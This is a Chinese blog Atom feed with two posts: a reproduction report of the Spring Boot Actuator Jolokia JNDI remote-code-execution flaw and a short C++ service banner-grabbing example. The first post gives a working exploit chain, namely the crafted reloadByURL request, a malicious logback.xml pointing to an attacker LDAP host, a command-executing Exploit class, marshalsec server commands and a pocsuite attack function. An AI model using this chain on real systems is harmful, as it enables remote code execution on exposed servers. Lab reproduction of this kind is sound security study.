<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>糖醋大白菜 の 后花园</title>
  
  <subtitle>蚂蚁森林小王子</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-12-11T01:10:57.520Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>糖醋大白菜</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>spring boot actuator jolokia 漏洞复现报告</title>
    <link href="http://yoursite.com/2019/12/03/Spring-Boot-Actuator-Jolokia/"/>
    <id>http://yoursite.com/2019/12/03/Spring-Boot-Actuator-Jolokia/</id>
    <published>2019-12-03T01:11:08.152Z</published>
    <updated>2019-12-11T01:10:57.520Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-漏洞测试环境"><a href="#0x01-漏洞测试环境" class="headerlink" title="0x01 漏洞测试环境"></a>0x01 漏洞测试环境</h3><p>一个包含 Spring Boot Actuators 的漏洞应用，该测试环境包含4个库：spring-boot-starter-web、spring-boot-starter-actuator、spring-cloud-starter-netflix-eureka-client、jolokia-core。注意该测试需要在jdk1.8.181版本或其他版本下编译运行才可以。本文使用了Java的JNDI注入，JNDI可以对接RMI服务，也可以对接LDAP服务，LDAP也能返回JNDI Reference对象，利用过程与RMI Reference基本一致，只是lookup()中的URL为一个LDAP地址：ldap://xxx/xxx，由攻击者控制的LDAP服务端返回一个恶意的JNDI Reference对象。并且LDAP服务的Reference远程加载Factory类不受上一点中 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制，所以适用范围更广。<br><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1g9s0nuahkjj30hs07ldg0.jpg" alt="OracleRMIAndLDAP"><br>不过在2018年10月，Java最终也修复了这个利用点，对LDAP Reference远程工厂类的加载增加了限制，在Oracle JDK 11.0.1、8u182、7u191、6u201之后 com.sun.jndi.ldap.object.trustURLCodebase 属性的默认值被调整为false，还对应的分配了一个漏洞编号CVE-2018-3149。因此该测试环境需要在以下基本版本下编译，漏洞才生效。</p><h3 id="0x02-Spring-Boot-Actuator介绍"><a href="#0x02-Spring-Boot-Actuator介绍" class="headerlink" title="0x02 Spring Boot Actuator介绍"></a>0x02 Spring Boot Actuator介绍</h3><p>Spring Boot Acuator 可以帮助你监控和管理Spring Boot应用，比如健康检查、审计、统计和HTTP追踪等。所有的这些特性可以通过JMX或者HTTP endpoints来获得。也就是说 Acuator 可以通过原生的端点(endpoint)来执行，常用的原生端点有 health、env、info，对于web应用而言，可以通过 JMX 来获得，该JMX就是jolokia。</p><p>参考资料：</p><ul><li><a href="https://www.secrss.com/articles/9862" target="_blank" rel="noopener">SpringBoot命令执行漏洞分析与PoC</a></li><li><a href="https://www.freebuf.com/news/193509.html" target="_blank" rel="noopener">Springboot之actuator配置不当的漏洞利用</a></li></ul><h3 id="0x03-jolokia介绍"><a href="#0x03-jolokia介绍" class="headerlink" title="0x03 jolokia介绍"></a>0x03 jolokia介绍</h3><p>Jolokia是一个用来访问远程JMX MBeans的方法，它可以利用JSON通过Http实现JMX远程管理的开源项目，即允许对所有已经注册的MBean进行Http访问，具有快速、简单等特点。除了支持基本的JMX操作之外，它还提供一些独特的特性来增强JMX远程管理如：批量请求，细粒度安全策略等。</p><p>那JMX又是什么呢？<br>JMX：（Java Management Extensions，即Java管理扩展）是一个为应用程序、设备、系统等植入管理功能的框架。</p><p>参考资料：</p><ul><li><a href="https://blog.csdn.net/yang382197207/article/details/12911855" target="_blank" rel="noopener">jolokia 学习心得</a></li><li><a href="https://blog.csdn.net/lmy86263/article/details/71037316" target="_blank" rel="noopener">理解JMX之介绍和简单使用</a></li></ul><h3 id="0x04-JNDI-RMI-LDAP-介绍"><a href="#0x04-JNDI-RMI-LDAP-介绍" class="headerlink" title="0x04 JNDI/RMI/LDAP 介绍"></a>0x04 JNDI/RMI/LDAP 介绍</h3><p>N/D服务是Naming Service 和 Directory Service ，就是JNDI的命名服务和目录服务。</p><p>JNDI，JNDI即Java Naming and Directory Interface，翻译成中文就Java命令和目录接口，2016年的BlackHat大会上web议题重点讲到，JNDI提供了很多实现方式，主要有RMI，LDAP，CORBA等。</p><p>RMI, Remote Method Invocation 是专为Java环境设计的远程方法调用机制，远程服务器实现具体的Java方法并提供接口，客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法。RMI依赖的通信协议为JRMP(Java Remote Message Protocol ，Java 远程消息交换协议)，该协议为Java定制，要求服务端与客户端都为Java编写。这个协议就像HTTP协议一样，规定了客户端和服务端通信要满足的规范。在RMI中对象是通过序列化方式进行编码传输的。</p><p>LDAP是开放的Internet标准，支持跨平台的Internet协议，在业界中得到广泛认可的，并且市场上或者开源社区上的大多产品都加入了对LDAP的支持，因此对于这类系统，不需单独定制，只需要通过LDAP做简单的配置就可以与服务器做认证交互。“简单粗暴”，可以大大降低重复开发和对接的成本。</p><p>marshalsec 是一个可以方便的开启 RMI 和 LDAP 服务的工具。</p><blockquote></blockquote><p>开启rmi服务<br>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer <a href="http://VPS/ExportObject" target="_blank" rel="noopener">http://VPS/ExportObject</a> 1099<br>开启ldap服务<br>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.L</p><p>参考资料：</p><ul><li><a href="https://blog.sari3l.com/posts/469de5e6/" target="_blank" rel="noopener">JNDI/LADP 学习</a></li><li><a href="https://ep.heibai.org/post/1360.html" target="_blank" rel="noopener">漏洞复现丨快速开启RMI&amp;&amp;LDAP</a></li></ul><h3 id="0x05-logback-JMXConfigurator-中的“reloadByURL”函数详解"><a href="#0x05-logback-JMXConfigurator-中的“reloadByURL”函数详解" class="headerlink" title="0x05  logback JMXConfigurator 中的“reloadByURL”函数详解"></a>0x05  logback JMXConfigurator 中的“reloadByURL”函数详解</h3><p>logback JMXConfigurator 允许通过 JMX 来配置 logback。简单来说就是，它允许你从默认配置文件，指定的文件或者 URL 重新配置 logback，列出 logger 以及修改 logger 级别。jolokia在logback JMXConfigurator中提供的“reloadByURL”方法允许我们从外部URL重新加载日志的记录配置。 对于我们来说，只需导航到以下内容即可触发：<br><a href="http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/artsploit.com!/logback.xml" target="_blank" rel="noopener">http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/artsploit.com!/logback.xml</a> </p><p>logback JMXConfigurator中提供以下几个操作：</p><ul><li>使用默认配置文件重新加载 logback 的配置</li><li>通过指定的 URL 重新加载配置</li><li>通过指定的文件重新加载配置</li><li>设置指定的 logger 的级别。想要设置为 null，传递 “null” 字符串就可以</li><li>获取指定 logger 的级别。返回值可以为 null</li><li>或者指定 logger 的有效级别</li></ul><h3 id="0x06-如何找到利用点"><a href="#0x06-如何找到利用点" class="headerlink" title="0x06 如何找到利用点"></a>0x06 如何找到利用点</h3><p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1g9s0o4s7wwj31m40g8gp3.jpg" alt="Screen Shot 2019-12-10 at 20.21.35"><br>参见官网给出的文档显示，jolokia列出了所有可以被操作的Mbean。在前面我们也看到了，在http请求中，其中的一项是Mbean name。下面我们还可以从源码的角度看一下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// com.sun.jmx.interceptor.DefaultMbeanServerInterceptor.java</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(ObjectName name, String operationName,</span></span></span><br><span class="line"><span class="function"><span class="params">                         Object params[], String signature[])</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> InstanceNotFoundException, MBeanException,</span></span><br><span class="line"><span class="function">                   ReflectionException </span>&#123;</span><br><span class="line"></span><br><span class="line">        name = nonDefaultDomain(name);</span><br><span class="line"></span><br><span class="line">        DynamicMBean instance = getMBean(name);</span><br><span class="line">        checkMBeanPermission(instance, operationName, name, <span class="string">"invoke"</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> instance.invoke(operationName, params, signature);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">            rethrowMaybeMBeanException(t);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> AssertionError();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这段代码的大致意思也就明白了，就是最终执行的时候是通过getMBean这个函数来得到一个实例，然后这个实例执行后面的操作。</p><p>在该测试中我们已经找到的Spring Boot Acuator 程序中的一个 reloadByURL 的利用点，利用该函数可以加载任意外部资源，并且具备解析xml文档的功能。那么就可以利用xml文件中 insertFromJNDI 标签，该标签可以加载任意Java类，从而实现远程Java命令执行，在16年blackhat中有一场关于N/D服务以及恶意类绑定的演讲，其中详细描述了 如何利用 JNDI 实现 Java应用程序的远程执行。</p><h3 id="0x07-POC构造"><a href="#0x07-POC构造" class="headerlink" title="0x07  POC构造"></a>0x07  POC构造</h3><p>我们大概了解了该程序的漏洞位置以及相应的原理，如何构造有效的POC还是一个漏洞利用的重点。<br>先看一下<strong>JmxExecRequest</strong>的参数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// org.jolokia.request.JmxExecRequest.java</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Constructor for creating a JmxRequest resulting from an HTTP GET request</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> pObjectName name of MBean to execute the operation upon. Must not be null.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> pOperation name of the operation to execute. Must not be null.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> pArguments arguments to to used for executing the request. Can be null</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> pParams optional params used for processing the request.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> MalformedObjectNameException if the object name is not in proper format</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">  JmxExecRequest(String pObjectName,String pOperation,List pArguments,</span><br><span class="line">                     ProcessingParameters pParams) <span class="keyword">throws</span> MalformedObjectNameException &#123;</span><br><span class="line">          <span class="keyword">super</span>(RequestType.EXEC, pObjectName, <span class="keyword">null</span> <span class="comment">/* path is not supported for exec requests */</span>, pParams);</span><br><span class="line">          operation = pOperation;</span><br><span class="line">          arguments = pArguments;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>JmxExecRequest总共有4个参数，其中pObjectName是Mbean的名称（不能为空），pOperation 是要执行的操作，不能为空，pArguments 是要执行请求的参数，可以为空，pParams是用来请求的可选参数（optional）。所以下面看一下JmxRequestFactory.createGetRequest是怎么得到 pathInfo的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// org.jolokia.http.HttpRequestHandler.java</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> JSONAware <span class="title">handleGetRequest</span><span class="params">(String pUri, String pPathInfo, Map&lt;String, String[]&gt; pParameterMap)</span> </span>&#123;</span><br><span class="line">        String pathInfo = extractPathInfo(pUri, pPathInfo);</span><br><span class="line"></span><br><span class="line">        JmxRequest jmxReq =</span><br><span class="line">JmxRequestFactory.createGetRequest(pathInfo,getProcessingParameter(pParameterMap));</span><br><span class="line">        <span class="keyword">if</span> (backendManager.isDebug()) &#123;</span><br><span class="line">            logHandler.debug(<span class="string">"URI: "</span> + pUri);</span><br><span class="line">            logHandler.debug(<span class="string">"Path-Info: "</span> + pathInfo);</span><br><span class="line">            logHandler.debug(<span class="string">"Request: "</span> + jmxReq.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> executeRequest(jmxReq);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// org.jolokia.util.EscapeUtil.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String PATH_ESCAPE = <span class="string">"!"</span>;</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> List&lt;String&gt; <span class="title">parsePath</span><span class="params">(String pPath)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Special cases which simply implies 'no path'</span></span><br><span class="line">    <span class="keyword">if</span> (pPath == <span class="keyword">null</span> || pPath.equals(<span class="string">""</span>) || pPath.equals(<span class="string">"/"</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> replaceWildcardsWithNull(split(pPath, PATH_ESCAPE, <span class="string">"/"</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从上面两段代码中可以看到，<strong>createGetRequest</strong>函数最终会通过split函数来分割<strong>pathInfo</strong>，其中 <strong>PATH_ESCAPE</strong>的值为”!”，也就是说当!和/在一起的时候，!/ 会被解析为 / 。这样可以用来构造 reloadByUrl的URL值。</p><p>另外，在官网可以查询到 jolokia 的执行语法路径参数。</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1g9s0obehadj31c90u0n5j.jpg" alt="Screen Shot 2019-12-10 at 19.37.16"></p><blockquote><p>该请求路径也就是 <strong><base url>/exec/<mbean name>/<operation name>/<arg1>/<arg2>/….</arg2></arg1></operation></mbean></strong> </p></blockquote><p>logback Mbean：</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1g9s0oepeyij31100ggmzd.jpg" alt="Screen Shot 2019-12-10 at 20.08.30"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mbean name 为 ch.qos.logback.classic:name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/</span><br><span class="line">Operation: reloadByUrl</span><br><span class="line">Params: http:!/!/127.0.0.1!/logback.xml</span><br></pre></td></tr></table></figure><p>因此，最终构造出来的POC代码为：<br>127.0.0.1:8090/jolokia/exec/ch.qos.logback.classic:name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByUrl/http:!/!/127.0.0.1!/logback.xml </p><h3 id="0x09-漏洞验证流程"><a href="#0x09-漏洞验证流程" class="headerlink" title="0x09 漏洞验证流程"></a>0x09 漏洞验证流程</h3><ol><li><p>搭建一个简单的HTTP服务器，可用于下载logback.xml</p></li><li><p>“reloadByURL”函数从 <a href="http://127.0.0.1/logback.xml" target="_blank" rel="noopener">http://127.0.0.1/logback.xml</a> 下载新的配置并将其解析为Logback。 此恶意配置应具有以下内容：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">insertFromJNDI</span> <span class="attr">env-entry-name</span>=<span class="string">"ldap://artsploit.com:1389/jndi"</span> <span class="attr">as</span>=<span class="string">"appName"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>在易受攻击的服务器上解析此文件时，它会创建与“env-entry-name”参数值中指定的攻击者LDAP服务器的连接，从而导致JNDI进行解析。 恶意的LDAP服务器可以返回具有“引用”类型的对象，以触发在目标应用程序上执行字节码。 </p></li><li><p>创建恶意类，比如实现打开计算器的操作，在构造函数 Exploit() 中写入执行代码，在恶意类加载的时候即可执行恶意代码。然后在8081端口下开启一个HTTP服务，或者使用刚才的8080端口的HTTP服务也可以。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">exec</span><span class="params">(String command)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String returnValue = <span class="string">""</span>;</span><br><span class="line">        BufferedInputStream inputStream = <span class="keyword">new</span> BufferedInputStream(Runtime.getRuntime().exec(command).getInputStream());</span><br><span class="line">        BufferedReader bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(inputStream));</span><br><span class="line">        String lineStr = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">while</span>((lineStr = bufferedReader.readLine())!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            sb += lineStr + <span class="string">"\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        inputStream.close();</span><br><span class="line">        bufferedReader.close();</span><br><span class="line">        <span class="keyword">return</span> returnValue; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">exec(<span class="string">"open /System/Applications/Calculator.app"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p>开启JNDI，使用marshalsec可以很方便的开启JNDI服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:8081/<span class="comment">#Exploit 1389</span></span><br></pre></td></tr></table></figure></li><li><p>编写poc suite，该POC较为简单，只需要在_attack下添加一个HTTP请求即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">def _attack(self):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line"></span><br><span class="line">        payload = &quot;/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/127.0.0.1:8080!/logback.xml&quot;</span><br><span class="line">        vul_url = self.url + payload</span><br><span class="line">        headers = &#123;</span><br><span class="line">            &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.get(vul_url, headers=headers)</span><br><span class="line">        if r.status_code == 200:</span><br><span class="line">            result[&apos;ShellInfo&apos;] = &#123;&#125;</span><br><span class="line">            result[&apos;ShellInfo&apos;][&apos;Content&apos;] = r.text</span><br><span class="line">        return self.parse_output(result)</span><br></pre></td></tr></table></figure></li></ol><p>最终的测试结果如下：</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1g9s0onl9syj31mm0u0h1w.jpg" alt="Screen Shot 2019-12-10 at 22.18.04"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-漏洞测试环境&quot;&gt;&lt;a href=&quot;#0x01-漏洞测试环境&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞测试环境&quot;&gt;&lt;/a&gt;0x01 漏洞测试环境&lt;/h3&gt;&lt;p&gt;一个包含 Spring Boot Actuators 的漏洞应用，该
      
    
    </summary>
    
    
      <category term="安全渗透" scheme="http://yoursite.com/tags/%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F/"/>
    
      <category term="spring boot" scheme="http://yoursite.com/tags/spring-boot/"/>
    
      <category term="spring boot actuator" scheme="http://yoursite.com/tags/spring-boot-actuator/"/>
    
      <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>C++获取服务banner</title>
    <link href="http://yoursite.com/2019/10/24/C++%E8%8E%B7%E5%8F%96%E6%9C%8D%E5%8A%A1banner/"/>
    <id>http://yoursite.com/2019/10/24/C++获取服务banner/</id>
    <published>2019-10-24T12:40:00.000Z</published>
    <updated>2019-11-03T05:18:08.315Z</updated>
    
    <content type="html"><![CDATA[<p>网上有很多获取服务banner的文章，但大多数都是写的python代码，根据python代码用C++写了一份。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) != <span class="number">3</span>:</span><br><span class="line">    print(<span class="string">"argv  error"</span>)</span><br><span class="line">    sys.exit()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ip = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    port = int(sys.argv[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">    banner = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">    banner.connect((ip, port))</span><br><span class="line"></span><br><span class="line">    banner_recv = banner.recv(<span class="number">4096</span>)</span><br><span class="line"></span><br><span class="line">    time.sleep(<span class="number">10</span>)</span><br><span class="line">    print(banner_recv)</span><br><span class="line"></span><br><span class="line">    banner.close()</span><br><span class="line"></span><br><span class="line">    exit()</span><br></pre></td></tr></table></figure><p>看了一下，直接在建立连接之后，服务就会返回一份含有banner的信息。那么直接用C++的socket函数写一遍就OK了。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">WSADATA wsaData;</span><br><span class="line"><span class="keyword">int</span> iResult;</span><br><span class="line"></span><br><span class="line">SOCKET ConnectSocket = INVALID_SOCKET;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">clientService</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *sendbuf = <span class="string">"this is a test"</span>;</span><br><span class="line"><span class="keyword">char</span> recvbuf[DEFAULT_BUFLEN];</span><br><span class="line"><span class="keyword">int</span> recvbuflen = DEFAULT_BUFLEN;</span><br><span class="line"></span><br><span class="line"><span class="comment">//----------------------</span></span><br><span class="line"><span class="comment">// Initialize Winsock</span></span><br><span class="line">iResult = WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line"><span class="keyword">if</span> (iResult != NO_ERROR) &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"WSAStartup failed: %d\n"</span>, iResult);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//----------------------</span></span><br><span class="line"><span class="comment">// Create a SOCKET for connecting to server</span></span><br><span class="line">ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line"><span class="keyword">if</span> (ConnectSocket == INVALID_SOCKET) &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Error at socket(): %ld\n"</span>, WSAGetLastError());</span><br><span class="line">  WSACleanup();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//----------------------</span></span><br><span class="line"><span class="comment">// The sockaddr_in structure specifies the address family,</span></span><br><span class="line"><span class="comment">// IP address, and port of the server to be connected to.</span></span><br><span class="line">clientService.sin_family = AF_INET;</span><br><span class="line">clientService.sin_addr.s_addr = inet_addr(<span class="string">"122.51.26.63"</span>);</span><br><span class="line">clientService.sin_port = htons(<span class="number">22</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//----------------------</span></span><br><span class="line"><span class="comment">// Connect to server.</span></span><br><span class="line">iResult = connect(ConnectSocket, (SOCKADDR*)&amp;clientService, <span class="keyword">sizeof</span>(clientService));</span><br><span class="line"><span class="keyword">if</span> (iResult == SOCKET_ERROR) &#123;</span><br><span class="line">  closesocket(ConnectSocket);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Unable to connect to server: %ld\n"</span>, WSAGetLastError());</span><br><span class="line">  WSACleanup();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"></span><br><span class="line">  iResult = recv(ConnectSocket, recvbuf, recvbuflen, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (iResult &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Bytes received: %d\n"</span>, iResult);</span><br><span class="line">    printf_s(<span class="string">"recevied bytes: %s\n"</span>, recvbuf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (iResult == <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Connection closed\n"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"recv failed: %d\n"</span>, WSAGetLastError());</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">while</span> (iResult &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br></pre></td></tr></table></figure><p>一开始是打算看一下nmap的banner script的源码写的，发现里面直接调用了一个banner函数，就没有继续深究下去了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;网上有很多获取服务banner的文章，但大多数都是写的python代码，根据python代码用C++写了一份。&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span cla
      
    
    </summary>
    
      <category term="C++" scheme="http://yoursite.com/categories/C/"/>
    
      <category term="安全渗透" scheme="http://yoursite.com/categories/C/%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F/"/>
    
    
